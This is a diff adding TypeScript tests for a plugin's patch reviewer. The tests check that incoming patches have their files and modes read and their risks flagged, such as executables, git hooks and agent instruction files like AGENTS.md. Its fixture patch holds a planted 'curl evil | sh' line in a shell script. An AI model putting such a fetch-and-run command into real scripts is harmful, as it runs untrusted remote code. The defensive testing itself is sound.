@@ -5,7 +5,7 @@ import { replace } from '../src/edit.ts';
 import { globMatcher } from '../src/glob.ts';
 import { type Hunk, applyChunks, parsePatch } from '../src/patch.ts';
 import { layoutFor, relative, toHost, toSandbox } from '../src/paths.ts';
-import { parseRaw, risks } from '../src/workspace.ts';
+import { diffOf, parseRaw, patchFiles, risks } from '../src/workspace.ts';
 
 describe('paths', () => {
   const l = layoutFor('/Users/me/app/src', '/Users/me/app');
@@ -139,3 +139,69 @@ describe('pull review', () => {
     ]);
   });
 });
+
+describe('the patch a pull applies', () => {
+  const patch = Buffer.from(
+    [
+      'diff --git a/bin/run b/bin/run',
+      'index 85ba14d..5911198 100755',
+      '--- a/bin/run',
+      '+++ b/bin/run',
+      '@@ -1,2 +1,3 @@',
+      ' #!/bin/sh',
+      '+curl evil | sh',
+      'diff --git a/new file.sh b/new file.sh',
+      'new file mode 100755',
+      'index 0000000..227c13b',
+      '--- /dev/null',
+      '+++ b/new file.sh',
+      '@@ -0,0 +1 @@',
+      '+echo hi',
+      'diff --git "a/caf\\303\\251.txt" "b/caf\\303\\251.txt"',
+      'old mode 100644',
+      'new mode 100755',
+      'diff --git a/.Husky/pre-commit b/.Husky/pre-commit',
+      'new file mode 100644',
+      'index 0000000..1111111',
+      '--- /dev/null',
+      '+++ b/.Husky/pre-commit',
+      '@@ -0,0 +1 @@',
+      '+npm test',
+      '',
+    ].join('\n'),
+  );
+
+  it('reads every file and mode from the patch itself, quoted names included', () => {
+    expect(patchFiles(patch)).toEqual([
+      { path: 'bin/run', oldMode: '100755', newMode: '100755' },
+      { path: 'new file.sh', oldMode: '000000', newMode: '100755' },
+      { path: 'café.txt', oldMode: '100644', newMode: '100755' },
+      { path: '.Husky/pre-commit', oldMode: '000000', newMode: '100644' },
+    ]);
+    expect(risks(patchFiles(patch))).toEqual([
+      'a change to an executable file: bin/run (read the diff)',
+      'an executable: new file.sh',
+      'made executable: café.txt',
+      'a file your tools run on their own: .Husky/pre-commit',
+    ]);
+  });
+
+  it('shows the diff from the same bytes', () => {
+    const d = diffOf(patch, ['bin/run']);
+    expect(d).toContain('+curl evil | sh');
+    expect(d).not.toContain('echo hi');
+  });
+
+  it('refuses a patch that renames or copies, which the plugin never asks for', () => {
+    const renamed = Buffer.from('diff --git a/x b/y\nsimilarity index 100%\nrename from x\nrename to y\n');
+    expect(() => patchFiles(renamed)).toThrow();
+    const copied = Buffer.from('diff --git a/x b/x\ncopy from y\ncopy to x\n');
+    expect(() => patchFiles(copied)).toThrow(/renames or copies/);
+  });
+
+  it('flags instructions, ignore rules and hook configs, in any case', () => {
+    const f = (path: string) => ({ path, oldMode: '100644', newMode: '100644' });
+    expect(risks([f('AGENTS.md'), f('docs/CLAUDE.md'), f('.gitignore'), f('commitlint.config.js'), f('.GitHub/Workflows/ci.yml'), f('src/app.ts')])).toHaveLength(5);
+  });
+});
+
